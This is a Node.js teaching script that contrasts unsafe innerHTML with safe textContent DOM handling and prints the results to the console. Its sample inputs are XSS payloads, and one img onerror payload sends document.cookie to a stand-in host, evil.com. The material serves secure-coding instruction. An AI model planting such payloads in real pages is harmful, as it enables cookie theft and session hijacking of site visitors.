/**
 * Chapter 21 — Example: xss-examples.js
 *
 * Run:  node examples-node/phase-03/ch-21-security/xss-examples.js
 *
 * Demonstrates unsafe vs safe DOM manipulation patterns using string-based
 * examples. Since Node.js does not have a real DOM, we simulate the
 * concepts with strings to show what would happen in a browser.
 *
 * Requires Node.js 18+.
 */

const header = (title) => {
  console.log(`\n${"=".repeat(70)}`);
  console.log(`  ${title}`);
  console.log(`${"=".repeat(70)}\n`);
};

// ═══════════════════════════════════════════════════════════════════════════════
// Helper: Simulated DOM behavior
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Simulates what innerHTML does — inserts the string as-is (no escaping).
 * In a real browser, this would parse and execute any embedded scripts.
 */
function simulateInnerHTML(userInput) {
  return `<div>${userInput}</div>`;
}

/**
 * Simulates what textContent does — escapes all HTML characters.
 * In a real browser, this would render the string as plain text.
 */
function simulateTextContent(userInput) {
  const escaped = userInput
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
  return `<div>${escaped}</div>`;
}

// ═══════════════════════════════════════════════════════════════════════════════
// 1. Basic XSS via innerHTML
// ═══════════════════════════════════════════════════════════════════════════════
header("1. Basic XSS via innerHTML");

{
  const userComment = `Great article! <script>alert('XSS')</script>`;

  console.log("  User input:");
  console.log(`    "${userComment}"\n`);

  console.log("  UNSAFE — Using innerHTML:");
  console.log(`    ${simulateInnerHTML(userComment)}`);
  console.log("    ^ The <script> tag would EXECUTE in a real browser.\n");

  console.log("  SAFE — Using textContent:");
  console.log(`    ${simulateTextContent(userComment)}`);
  console.log("    ^ The <script> tag is rendered as harmless text.");
}

// ═══════════════════════════════════════════════════════════════════════════════
// 2. XSS via Image Tag with onerror
// ═══════════════════════════════════════════════════════════════════════════════
header("2. XSS via Image Tag with onerror");

{
  const userInput = `<img src="x" onerror="document.location='https://evil.com/steal?cookie='+document.cookie">`;

  console.log("  User input:");
  console.log(`    ${userInput}\n`);

  console.log("  UNSAFE — Using innerHTML:");
  console.log(`    ${simulateInnerHTML(userInput)}`);
  console.log("    ^ The onerror handler would fire because 'x' is not a valid image.\n");

  console.log("  SAFE — Using textContent:");
  console.log(`    ${simulateTextContent(userInput)}`);
  console.log("    ^ Rendered as visible text, no image or handler created.");
}

// ═══════════════════════════════════════════════════════════════════════════════
// 3. XSS via Event Handler Attributes
// ═══════════════════════════════════════════════════════════════════════════════
header("3. XSS via Event Handler Attributes");

{
  const userInput = `<div onmouseover="alert('XSS')">Hover over me</div>`;

  console.log("  User input:");
  console.log(`    ${userInput}\n`);

  console.log("  UNSAFE — Using innerHTML:");
  console.log(`    ${simulateInnerHTML(userInput)}`);
  console.log("    ^ Hovering would trigger the alert in a real browser.\n");

  console.log("  SAFE — Using textContent:");
  console.log(`    ${simulateTextContent(userInput)}`);
  console.log("    ^ Rendered as plain text. No event handler created.");
}

// ═══════════════════════════════════════════════════════════════════════════════
// 4. XSS via SVG
// ═══════════════════════════════════════════════════════════════════════════════
header("4. XSS via SVG");

{
  const userInput = `<svg onload="alert('XSS')"><circle r="50"/></svg>`;

  console.log("  User input:");
  console.log(`    ${userInput}\n`);

  console.log("  UNSAFE — Using innerHTML:");
  console.log(`    ${simulateInnerHTML(userInput)}`);
  console.log("    ^ The SVG onload handler would fire immediately.\n");

  console.log("  SAFE — Using textContent:");
  console.log(`    ${simulateTextContent(userInput)}`);
  console.log("    ^ Rendered as harmless text.");
}

// ═══════════════════════════════════════════════════════════════════════════════
// 5. DOM-Based XSS via URL Parameters
// ═══════════════════════════════════════════════════════════════════════════════
header("5. DOM-Based XSS via URL Parameters");

{
  // Simulate a URL with a malicious query parameter
  const maliciousURL = "https://example.com/search?q=<script>alert('XSS')</script>";
  const urlObj = new URL(maliciousURL);
  const searchQuery = urlObj.searchParams.get("q");

  console.log("  Simulated URL:");
  console.log(`    ${maliciousURL}\n`);
  console.log("  Extracted query parameter:");
  console.log(`    q = "${searchQuery}"\n`);

  console.log("  UNSAFE — element.innerHTML = 'Results for: ' + query");
  console.log(`    ${simulateInnerHTML("Results for: " + searchQuery)}`);
  console.log("    ^ The script tag would execute.\n");

  console.log("  SAFE — element.textContent = 'Results for: ' + query");
  console.log(`    ${simulateTextContent("Results for: " + searchQuery)}`);
  console.log("    ^ The script tag is displayed as text.");
}

// ═══════════════════════════════════════════════════════════════════════════════
// 6. XSS via Template Literals (Common Mistake)
// ═══════════════════════════════════════════════════════════════════════════════
header("6. Template Literals Do NOT Escape HTML");

{
  const userName = `<img src=x onerror=alert('XSS')>`;

  // This is a common mistake — developers think template literals are safe
  const unsafeHTML = `<p>Welcome, ${userName}!</p>`;

  console.log("  User-provided name:");
  console.log(`    "${userName}"\n`);

  console.log("  Template literal result (UNSAFE for innerHTML):");
  console.log(`    ${unsafeHTML}`);
  console.log("    ^ Template literals are just string concatenation.");
  console.log("    ^ They do NOT escape HTML. Using this with innerHTML is dangerous.\n");

  console.log("  Safe approach:");
  console.log(`    ${simulateTextContent(userName)}`);
  console.log("    ^ Always escape before inserting into the DOM.");
}

// ═══════════════════════════════════════════════════════════════════════════════
// 7. Safe Pattern: createElement + textContent
// ═══════════════════════════════════════════════════════════════════════════════
header("7. Safe Pattern: createElement + textContent");

{
  console.log("  In a real browser, the SAFE way to build DOM:\n");
  console.log("    const card = document.createElement('div');");
  console.log("    card.className = 'user-card';");
  console.log("");
  console.log("    const name = document.createElement('h2');");
  console.log("    name.textContent = userInput; // SAFE — auto-escapes");
  console.log("");
  console.log("    const bio = document.createElement('p');");
  console.log("    bio.textContent = userBio; // SAFE — auto-escapes");
  console.log("");
  console.log("    card.append(name, bio);");
  console.log("    container.appendChild(card);");
  console.log("\n  This approach NEVER interprets user data as HTML.");
  console.log("  No matter what the user types, it is rendered as plain text.");
}

// ═══════════════════════════════════════════════════════════════════════════════
// 8. Summary Table
// ═══════════════════════════════════════════════════════════════════════════════
header("8. Summary — Dangerous vs Safe APIs");

{
  const rows = [
    ["element.innerHTML = userInput", "DANGEROUS", "element.textContent = userInput"],
    ["document.write(userInput)", "DANGEROUS", "DOM manipulation methods"],
    ["eval(userInput)", "DANGEROUS", "JSON.parse() for data"],
    ["setTimeout(userString, ms)", "DANGEROUS", "setTimeout(function, ms)"],
    ["location.href = userInput", "RISKY", "Validate URL scheme first"],
    ["$el.html(userInput) (jQuery)", "DANGEROUS", "$el.text(userInput)"],
  ];

  console.log("  API                              | Risk      | Safe Alternative");
  console.log("  " + "-".repeat(66));
  for (const [api, risk, safe] of rows) {
    console.log(`  ${api.padEnd(35)}| ${risk.padEnd(10)}| ${safe}`);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
console.log("\n--- End of xss-examples.js ---\n");
